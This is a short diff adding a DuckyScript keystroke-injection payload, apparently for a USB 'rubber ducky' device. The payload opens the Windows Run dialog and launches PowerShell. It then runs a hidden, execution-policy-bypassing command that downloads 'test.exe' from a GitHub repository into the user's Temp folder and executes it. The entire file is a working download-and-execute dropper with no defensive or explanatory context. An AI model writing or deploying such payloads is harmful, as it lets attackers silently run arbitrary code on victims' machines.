@@ -1,0 +1,8 @@
+DELAY 100
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING powershell -ep Bypass -w hidden -Command "iwr -Uri 'https://github.com/greenstorm5417/funny/raw/refs/heads/main/test.exe' -OutFile 'C:\\Users\\sduss\\AppData\\Local\\Temp\\test.exe'; Start-Process 'C:\\Users\\sduss\\AppData\\Local\\Temp\\test.exe'"
+ENTER
